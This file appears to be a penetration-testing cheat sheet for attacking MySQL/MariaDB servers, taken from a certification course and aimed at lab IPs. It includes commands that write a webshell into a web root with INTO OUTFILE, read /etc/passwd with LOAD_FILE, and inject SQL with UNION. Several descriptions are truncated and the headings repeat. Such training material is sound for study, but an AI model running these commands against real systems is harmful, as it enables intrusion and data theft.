# MySQL / MariaDB

% mysql, mariadb, cpts

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - mysql
#cat/ATTACK #cpts
To interact with [MySQL](https://en.wikipedia.org/wiki/MySQL), we can use MySQL binaries for Linux (mysql) or Windows (mysql.exe). MySQL comes pre-installed on some Linux distributions, but we can install MySQL binaries

```
mysql -u username -pPassword123 -h 10.129.20.13
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - mysql-2
#cat/ATTACK #cpts
```
mysql.exe -u username -pPassword123 -h 10.129.20.13
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - write-file
#cat/ATTACK #cpts
MySQL does not have a stored procedure like xp_cmdshell, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose MySQL operates on a PHP-based

```
mysql> SELECT "" INTO OUTFILE '/var/www/html/webshell.php'
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - write-file-2
#cat/ATTACK #cpts
In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. Thes

```
mysql> show variables like "secure_file_priv"
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - read-file
#cat/ATTACK #cpts
As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

```
select LOAD_FILE("/etc/passwd")
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - mysql---connecting-to-the-sql-server
#cat/ATTACK #cpts
Attacking SQL Databases

```
mysql -u julio -pPassword123 -h 10.129.20.13
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - mysql---connecting-to-the-sql-server-2
#cat/ATTACK #cpts
Attacking SQL Databases

```
MySQL [(none)]>
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - show-databases
#cat/ATTACK #cpts
Attacking SQL Databases

```
mysql> SHOW DATABASES
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - select-a-database
#cat/ATTACK #cpts
Attacking SQL Databases

```
mysql> USE htbusers
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - show-tables
#cat/ATTACK #cpts
Attacking SQL Databases

```
mysql> SHOW TABLES
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - select-all-data-from-table-users
#cat/ATTACK #cpts
Attacking SQL Databases

```
mysql> SELECT * FROM users
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - mysql---read-local-files-in-mysql
#cat/ATTACK #cpts
Attacking SQL Databases

```
mysql> select LOAD_FILE("/etc/passwd")
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - sql-injection
#cat/ATTACK #cpts
It is possible to create fake entries using the `SELECT` operator. Let's input an invalid username to create a new user entry.

```
MariaDB [userdb]> select * from users where username='test' union select 'admin', 'welcome123'
```

## MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - MySQL / MariaDB - logrotate
#cat/ATTACK #cpts
To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:

```
sudo cat /var/lib/logrotate.status
```

